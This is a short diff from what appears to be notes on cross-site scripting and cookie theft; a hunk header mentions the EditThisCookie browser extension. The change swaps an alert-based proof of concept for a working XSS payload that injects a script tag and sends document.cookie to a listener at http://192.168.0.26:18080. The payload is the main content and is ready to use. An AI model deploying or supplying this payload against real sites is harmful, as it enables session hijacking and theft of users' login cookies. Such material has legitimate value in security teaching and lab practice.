@@ -24,5 +24,5 @@ https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccc
 ```
 
 ```
-<script>alert(document.cookie.split(";")[3])</script>
+<script>const s = document.createElement("script"); s.src="http://192.168.0.26:18080/?cookie=" + document.cookie;document.querySelector("head").append(s);</script>
 ```
